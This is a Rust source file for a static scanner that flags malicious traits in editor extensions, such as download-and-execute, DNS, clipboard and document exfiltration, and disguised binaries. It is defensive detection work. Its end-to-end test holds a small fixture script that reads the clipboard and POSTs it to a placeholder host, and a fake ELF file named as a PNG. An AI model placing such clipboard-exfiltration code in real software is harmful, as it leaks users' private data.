//! jest-ext-rs: the Rust analyzer of `jest-security scan-extension --deep`. JavaScript data flow,
//! obfuscation, native binaries, WebAssembly and YARA. Reads files only; never runs extension code.

mod entropy;
mod js;
mod native;
mod protocol;
mod yara;

use protocol::{Emitter, Location, Request};
use std::collections::BTreeMap;
use std::io::{Read, Write};
use std::path::{Path, PathBuf};
use std::sync::Mutex;
use std::sync::atomic::{AtomicUsize, Ordering};

const VERSION: &str = env!("CARGO_PKG_VERSION");

pub const VECTORS: [&str; 22] = [
    "ext/download-exec",
    "ext/workspace-harvest",
    "ext/dns-exfil",
    "ext/encoded-url",
    "ext/high-entropy-string",
    "ext/encrypted-payload",
    "ext/time-bomb",
    "ext/unsigned-binary",
    "ext/binary-dangerous-imports",
    "ext/binary-network-strings",
    "ext/packed-binary",
    "ext/binary-entropy",
    "ext/wasm-capabilities",
    "ext/yara-match",
    "ext/foreign-arch",
    "ext/binary-unexpected-path",
    "ext/webview-message-exec",
    "ext/open-external-startup",
    "ext/document-exfil",
    "ext/clipboard-exfil",
    "ext/secret-storage-abuse",
    "ext/storage-payload",
];

const MAX_LOCATIONS: usize = 20;
const MAX_BINARY: u64 = 256 << 20;
const JS_EXTS: [&str; 3] = ["js", "cjs", "mjs"];
const YARA_TEXT_EXTS: [&str; 10] = ["js", "cjs", "mjs", "sh", "ps1", "bat", "cmd", "py", "applescript", "scpt"];

/// One hit before aggregation.
struct Raw {
    vector: &'static str,
    message: String,
    loc: Location,
    flow: Vec<Location>,
    confidence: f64,
}

#[derive(Default)]
struct Agg {
    count: usize,
    files: std::collections::BTreeSet<String>,
    locations: Vec<Location>,
    first: String,
    flow: Vec<Location>,
    confidence: f64,
}

struct Files {
    js: Vec<PathBuf>,
    other: Vec<PathBuf>,
}

fn walk(root: &Path) -> Files {
    let mut out = Files { js: vec![], other: vec![] };
    let mut deps = vec![];
    for e in walkdir::WalkDir::new(root).follow_links(false).into_iter().filter_entry(|e| e.file_name() != ".git").flatten() {
        if !e.file_type().is_file() {
            continue;
        }
        let p = e.into_path();
        let ext = p.extension().and_then(|x| x.to_str()).unwrap_or("").to_ascii_lowercase();
        if JS_EXTS.contains(&ext.as_str()) {
            if p.components().any(|c| c.as_os_str() == "node_modules") { deps.push(p) } else { out.js.push(p) }
        } else {
            out.other.push(p);
        }
    }
    // The extension's own code first, then dependencies, so the file budget favours what it wrote.
    out.js.sort();
    deps.sort();
    out.js.extend(deps);
    out
}

fn rel(root: &Path, p: &Path) -> String {
    p.strip_prefix(root).unwrap_or(p).to_string_lossy().replace('\\', "/")
}

fn target_platform(root: &Path) -> Option<String> {
    let s = std::fs::read_to_string(root.join(".vsixmanifest")).ok()?;
    let i = s.find("TargetPlatform=\"")? + "TargetPlatform=\"".len();
    let j = s[i..].find('"')?;
    Some(s[i..i + j].to_string()).filter(|t| !t.is_empty())
}

fn analyze_file(root: &Path, p: &Path, is_js: bool, max_bytes: u64, target: Option<&str>, want: &dyn Fn(&str) -> bool) -> Vec<Raw> {
    let r = rel(root, p);
    let mut out = vec![];
    let Ok(meta) = std::fs::metadata(p) else {
        return out;
    };
    let mut head = [0u8; 16];
    let is_bin = !is_js && std::fs::File::open(p).and_then(|mut f| f.read(&mut head)).is_ok_and(|n| native::kind(&head[..n]).is_some());
    let limit = if is_bin { MAX_BINARY } else { max_bytes };
    let ext = p.extension().and_then(|x| x.to_str()).unwrap_or("").to_ascii_lowercase();
    if meta.len() > limit || (!is_js && !is_bin && !YARA_TEXT_EXTS.contains(&ext.as_str())) {
        return out;
    }
    let Ok(bytes) = std::fs::read(p) else {
        return out;
    };
    if is_js {
        for h in js::analyze(&bytes) {
            if want(h.vector) {
                let loc = Location::at(&r, h.line, h.col);
                let flow = h.source.map(|(l, c)| vec![Location::at(&r, l, c), loc.clone()]).unwrap_or_default();
                out.push(Raw { vector: h.vector, message: h.message, loc, flow, confidence: h.confidence });
            }
        }
    }
    if is_bin {
        for f in native::inspect(&r, &bytes, target) {
            if want(f.vector) {
                out.push(Raw { vector: f.vector, message: f.message, loc: Location::file(&r), flow: vec![], confidence: f.confidence });
            }
        }
    }
    if want("ext/yara-match") {
        for (rule, desc) in yara::scan(&bytes) {
            out.push(Raw {
                vector: "ext/yara-match",
                message: format!("YARA `{rule}` ({desc}) matched {r}"),
                loc: Location::file(&r),
                flow: vec![],
                confidence: 0.9,
            });
        }
    }
    out
}

fn analyze(req: &Request, out: &Emitter<impl Write + Send>) {
    let want = |v: &str| req.vectors.iter().any(|x| x == v);
    let max_files = req.options.max_files.unwrap_or(5000).max(1);
    let max_bytes = (req.options.max_file_m_b.unwrap_or(10.0) * 1024.0 * 1024.0) as u64;
    let workers = std::thread::available_parallelism().map(|n| n.get()).unwrap_or(4).min(8);
    for ext in &req.extensions {
        out.progress(&ext.id, "javascript data flow, binaries, YARA");
        let root = Path::new(&ext.path);
        let files = walk(root);
        let target = target_platform(root);
        let skipped_js = files.js.len().saturating_sub(max_files);
        let mut jobs: Vec<(PathBuf, bool)> = files.js.into_iter().take(max_files).map(|p| (p, true)).collect();
        jobs.extend(files.other.into_iter().map(|p| (p, false)));
        let next = AtomicUsize::new(0);
        let results: Mutex<Vec<Raw>> = Mutex::new(vec![]);
        std::thread::scope(|s| {
            for _ in 0..workers {
                // Deeply nested minified code needs a larger stack than the default.
                std::thread::Builder::new()
                    .stack_size(256 << 20)
                    .spawn_scoped(s, || {
                        loop {
                            let i = next.fetch_add(1, Ordering::Relaxed);
                            let Some((p, is_js)) = jobs.get(i) else { break };
                            let r = analyze_file(root, p, *is_js, max_bytes, target.as_deref(), &want);
                            if !r.is_empty() {
                                results.lock().unwrap().extend(r);
                            }
                        }
                    })
                    .expect("spawn worker");
            }
        });
        out.metric(&ext.id, "rs.files", jobs.len() as f64);
        if skipped_js > 0 {
            out.metric(&ext.id, "rs.jsSkipped", skipped_js as f64);
        }
        let mut by: BTreeMap<&'static str, Agg> = BTreeMap::new();
        let mut raws = results.into_inner().unwrap();
        raws.sort_by(|a, b| (a.loc.file.as_str(), a.loc.line).cmp(&(b.loc.file.as_str(), b.loc.line)));
        for r in raws {
            let a = by.entry(r.vector).or_default();
            if a.count == 0 {
                a.first = r.message.clone();
                a.flow = r.flow.clone();
            }
            a.count += 1;
            a.files.insert(r.loc.file.clone());
            a.confidence = a.confidence.max(r.confidence);
            if a.locations.len() < MAX_LOCATIONS {
                a.locations.push(r.loc);
            }
        }
        for (vector, a) in by {
            let files = a.files.len();
            let msg = format!(
                "{} ({} hit{} in {} file{})",
                a.first,
                a.count,
                if a.count == 1 { "" } else { "s" },
                files,
                if files == 1 { "" } else { "s" }
            );
            out.signal(&ext.id, vector, &msg, &a.locations, &a.flow, a.confidence);
        }
    }
    let ran: Vec<String> = VECTORS.iter().filter(|v| want(v)).map(|v| v.to_string()).collect();
    out.done(&ran, &[]);
}

fn main() {
    let cmd = std::env::args().nth(1).unwrap_or_default();
    match cmd.as_str() {
        "info" => println!(
            "{}",
            serde_json::json!({"name": "jest-ext-rs", "version": VERSION, "protocol": protocol::VERSION, "vectors": VECTORS})
        ),
        "version" | "--version" => println!("{VERSION}"),
        "analyze" => {
            let mut input = String::new();
            if std::io::stdin().read_to_string(&mut input).is_err() {
                eprintln!("cannot read request");
                std::process::exit(2);
            }
            let req: Request = match serde_json::from_str(&input) {
                Ok(r) => r,
                Err(e) => {
                    eprintln!("invalid request: {e}");
                    std::process::exit(2);
                }
            };
            if req.protocol != protocol::VERSION {
                eprintln!("unsupported protocol {} (want {})", req.protocol, protocol::VERSION);
                std::process::exit(2);
            }
            let out = Emitter::new(std::io::stdout());
            analyze(&req, &out);
        }
        _ => {
            eprintln!("usage: jest-ext-rs info | analyze < request.json | version");
            std::process::exit(2);
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn end_to_end() {
        let dir = std::env::temp_dir().join(format!("jest-ext-rs-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(dir.join("out")).unwrap();
        std::fs::write(
            dir.join("out/extension.js"),
            "const v = require('vscode');\nasync function go(){ const t = await v.env.clipboard.readText();\nfetch('https://c.example', { method: 'POST', body: t }); }",
        )
        .unwrap();
        std::fs::write(dir.join("out/logo.png"), b"\x7fELF\x02\x01\x01\0\0\0\0\0\0\0\0\0rest").unwrap();
        let req: Request = serde_json::from_value(serde_json::json!({
            "protocol": 1,
            "extensions": [{"id": "a.b", "version": "1", "path": dir.to_string_lossy(), "manifest": {}}],
            "vectors": ["ext/clipboard-exfil", "ext/binary-unexpected-path", "ext/yara-match"],
            "options": {}
        }))
        .unwrap();
        let mut buf = Vec::new();
        analyze(&req, &Emitter::new(&mut buf));
        let lines: Vec<serde_json::Value> = String::from_utf8(buf).unwrap().lines().map(|l| serde_json::from_str(l).unwrap()).collect();
        let signals: Vec<&serde_json::Value> = lines.iter().filter(|m| m["type"] == "signal").collect();
        let clip = signals.iter().find(|m| m["vector"] == "ext/clipboard-exfil").expect("clipboard flow");
        assert_eq!(clip["locations"][0], serde_json::json!({"file": "out/extension.js", "line": 3, "col": 1}));
        assert_eq!(clip["flow"][0]["line"], 2);
        assert!(signals.iter().any(|m| m["vector"] == "ext/binary-unexpected-path"));
        let done = lines.last().unwrap();
        assert_eq!(done["type"], "done");
        assert_eq!(done["ran"].as_array().unwrap().len(), 3);
        let _ = std::fs::remove_dir_all(&dir);
    }
}
